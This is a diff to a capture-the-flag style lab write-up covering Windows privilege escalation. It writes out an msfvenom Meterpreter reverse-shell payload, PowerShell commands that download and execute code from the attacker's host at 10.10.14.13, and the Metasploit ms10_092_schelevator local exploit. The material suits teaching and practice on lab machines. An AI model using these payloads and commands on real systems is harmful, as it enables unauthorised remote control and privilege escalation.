@@ -86,29 +86,25 @@ If we manually navigate to the path _10.10.10.11:8500/userfiles/file/G.jsp_ and 
 ## Privilege Escalation
 
 Now we have a session on the box with the user _tolis_.
-As we still want a Meterpreter session we will create a payload with _Magic Unicorn_ and upload that to the box.
+As we still want a Meterpreter session we will create a payload with _Msfvenom_ and upload that to the box.
 ```markdown
-/usr/share/unicorn-magic/unicorn.py windows/meterpreter/reverse_tcp 10.10.14.13 9001
-```
-
-This will create a payload file with Powershell code in it called **powershell_attack.txt** and a file called **unicorn.rc** which is used so Metasploit loads all the correct commands for this payload.
-```markdown
-msfconsole -r unicorn.rc
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=9001 -f exe > exploit.exe
 ```
 
 To execute the payload code we start a web server on our local machine and download it from the box with Powershell:
 ```markdown
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13:8000/exploit.txt')"
+powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.13:8000/exploit.exe','exploit.exe')"
 ```
 
-After executing this, the file will be downloaded from the box and executed. This will start a meterpreter session on Metasploit.
+After executing this will start a meterpreter session on Metasploit.
 
 Now we can use the _local_exploit_suggester module_ to enumerate for vulnerabilites:
 ```markdown
 use post/multi/recon/local_exploit_suggester
 ```
 
-We will use the suggested exploit _exploit/windows/local/ms10_092_schelevator_ tp escalate our privileges:
+Migrate the meterpreter session into a 64-bit process before running the exploit.
+We will use the suggested exploit _exploit/windows/local/ms10_092_schelevator_ tp escalate our privileges.
 ```markdown
 use exploit/windows/local/ms10_092_schelevator
 
